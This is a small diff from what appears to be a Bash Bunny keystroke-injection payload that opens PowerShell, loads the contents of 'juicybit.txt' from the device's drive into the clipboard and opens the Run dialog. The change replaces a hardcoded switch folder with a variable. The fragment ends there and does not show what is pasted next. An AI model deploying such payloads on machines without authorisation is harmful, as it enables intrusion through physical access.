@@ -35,7 +35,7 @@ QUACK DELAY 300
 QUACK STRING powershell.exe
 QUACK ENTER
 QUACK DELAY 100
-QUACK STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\switch1\juicybit.txt'))"
+QUACK STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\juicybit.txt'))"
 QUACK ENTER
 QUACK GUI r
 QUACK DELAY 300
